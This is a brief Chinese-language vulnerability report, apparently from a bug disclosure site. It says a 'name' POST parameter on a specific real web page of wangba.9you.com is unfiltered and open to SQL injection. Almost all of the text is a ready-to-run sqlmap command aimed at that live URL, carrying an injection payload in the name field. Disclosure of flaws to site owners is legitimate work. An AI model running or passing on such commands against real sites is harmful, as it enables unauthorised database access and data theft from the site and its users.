详细说明：

漏洞位置：

http://wangba.9you.com/ucenter/SearchPointRewards.aspx

POST中name参数没有过滤，引发注射

C:\Users\Administrator>sqlmap.py -u "http://wangba.9you.com/ucenter/SearchPointRewards.aspx" --data="gid=66&level=14&name=a' or 1=1* --&page=1&type=55" -p name
